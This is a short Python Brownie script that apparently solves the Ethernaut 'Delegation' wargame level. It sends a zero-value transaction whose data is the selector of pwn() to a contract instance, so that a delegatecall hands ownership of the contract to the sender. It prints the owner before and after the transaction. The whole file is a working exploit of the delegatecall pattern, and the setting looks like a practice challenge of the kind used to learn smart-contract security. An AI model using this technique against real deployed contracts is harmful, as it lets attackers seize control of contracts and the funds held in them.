from brownie import Contract, Delegation, accounts
import web3

INSTANCE_ADDRESS = "0xB14bCEe883A187B8d715B26dd5B6a9826A0Bf830"
ACCOUNT = "straul"

def get_account():
    account = accounts.load(ACCOUNT)
    return account


def hack_delegation(account):
    delegation = Contract.from_abi(name="Delegation", address=INSTANCE_ADDRESS, abi=Delegation.abi)

    print(f"Owner of contract before hack: {delegation.owner()}")
    # calldata needs to have the first 4 bytes of the keccak hash of the pwn() function
    calldata = web3.Web3.keccak(text="pwn()")[:4]  # take first 4 bytes
    print(f"Calling function with signature {calldata.hex()}")
    account.transfer(to=delegation.address, amount=0, data=calldata)
    print(f"Owner of contract after hack: {delegation.owner()}")


def main():
    account = get_account()
    hack_delegation(account)
